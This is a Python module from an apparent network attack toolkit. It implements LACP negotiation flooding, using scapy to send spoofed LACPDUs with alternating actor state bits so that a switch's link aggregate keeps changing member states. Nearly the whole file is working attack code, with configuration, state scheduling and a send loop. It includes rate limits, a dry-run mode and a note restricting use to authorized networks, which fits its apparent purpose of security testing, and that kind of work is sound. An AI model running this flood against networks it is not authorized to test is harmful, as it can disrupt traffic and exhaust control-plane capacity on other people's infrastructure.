"""LACP negotiation flooding: send LACPDUs at a high rate whose actor state keeps changing.

Each LACPDU makes the receiving aggregate process a negotiation step: it updates the partner
state of the member port and may move the member between collecting, distributing and
out-of-sync states. A stream of LACPDUs that alternates the state bits forces repeated state
changes, which use control-plane capacity and can disturb traffic on the aggregate even when
no member is added or removed.

This module sends LACPDUs from the operator's port, cycling through the actor state values the
operator chooses, at the configured interval. The effect to measure is how often the aggregate
changes the state of the member and whether its traffic is disturbed.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac, random_mac
from macabre.attacks.lacp_spoofing import MAX_FRAMES, MAX_KEY, MAX_PRIORITY, build_lacpdu

# Actor state values alternated by default: all bits set (Collecting and Distributing) and
# Activity, Timeout and Aggregation set without Synchronization, Collecting or Distributing.
DEFAULT_STATES = (0x3F, 0x07)
MAX_STATES = 8
MIN_INTERVAL = 0.01  # seconds; 100 LACPDUs per second at most


@dataclass(frozen=True)
class LacpNegotiationFloodingConfig:
    iface: str                          # attacker interface, on the link to the aggregate under test
    system_mac: str = ""                # actor system ID claimed; empty = a random MAC for the run
    key: int = 1                        # actor key claimed
    port_number: int = 1                # actor port number claimed
    system_priority: int = 32768        # actor system priority claimed
    port_priority: int = 128            # actor port priority claimed
    states: tuple[int, ...] = DEFAULT_STATES  # actor state values, used in turn
    frames: int = 200                   # LACPDUs to send in total
    interval: float = 0.02              # seconds between LACPDUs (50 per second by default)
    dry_run: bool = False               # build LACPDUs but do not send them

    def __post_init__(self) -> None:
        if self.system_mac:
            normalize_unicast_mac(self.system_mac)
        for name, value, limit in (
            ("Key", self.key, MAX_KEY),
            ("Port number", self.port_number, MAX_KEY),
            ("System priority", self.system_priority, MAX_PRIORITY),
            ("Port priority", self.port_priority, MAX_PRIORITY),
        ):
            if not 0 <= value <= limit:
                raise ValueError(f"{name} must be between 0 and {limit}.")
        if not 1 <= len(self.states) <= MAX_STATES:
            raise ValueError(f"Give between 1 and {MAX_STATES} state values.")
        for state in self.states:
            if not 0 <= state <= 0xFF:
                raise ValueError("Each state value must be between 0x00 and 0xFF.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")
        if self.interval < MIN_INTERVAL:
            raise ValueError(f"Interval must be at least {MIN_INTERVAL} s.")


@dataclass
class LacpNegotiationFloodingStats:
    sender_mac: str = ""
    frames: int = 0
    state_changes: int = 0              # LACPDUs whose state differs from the one sent before
    status: str = ""


def parse_states(text: str) -> tuple[int, ...]:
    """Parse comma-separated state values, decimal or hex (0x..), for the GUI and the CLI."""
    values = []
    for part in text.split(","):
        part = part.strip()
        if not part:
            continue
        try:
            values.append(int(part, 0))
        except ValueError as exc:
            raise ValueError(f"State value '{part}' is not a number.") from exc
    if not values:
        raise ValueError("Give at least one state value.")
    return tuple(values)


def state_schedule(states: tuple[int, ...], frames: int) -> list[int]:
    """The actor state of each LACPDU, cycling through `states`."""
    return [states[index % len(states)] for index in range(frames)]


def run_lacp_negotiation_flooding(
    config: LacpNegotiationFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[LacpNegotiationFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> LacpNegotiationFloodingStats:
    """Send `frames` LACPDUs, one every `interval` seconds, cycling the actor state."""
    rng = rng or random.Random()
    send = send or sendp
    sender = config.system_mac or random_mac(rng)
    schedule = state_schedule(config.states, config.frames)
    expected_changes = sum(1 for before, after in zip(schedule, schedule[1:]) if before != after)

    if config.dry_run:
        states = ", ".join(f"0x{state:02X}" for state in config.states)
        stats = LacpNegotiationFloodingStats(
            sender_mac=sender,
            status=(
                f"Dry run: would send {config.frames} LACPDU(s) claiming system {sender}, key {config.key}, "
                f"port {config.port_number}, cycling states {states} ({expected_changes} state changes). "
                "Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    frames_by_state: dict[int, Packet] = {
        state: build_lacpdu(sender, config.key, config.port_number, config.system_priority,
                            config.port_priority, state)
        for state in set(config.states)
    }
    stats = LacpNegotiationFloodingStats(sender_mac=sender)
    previous: int | None = None
    for state in schedule:
        if stop_event.is_set():
            break
        send(frames_by_state[state], iface=config.iface, verbose=False)
        stats.frames += 1
        if previous is not None and state != previous:
            stats.state_changes += 1
        previous = state
        on_progress(replace(stats))
        if stop_event.wait(config.interval):
            break
    return stats
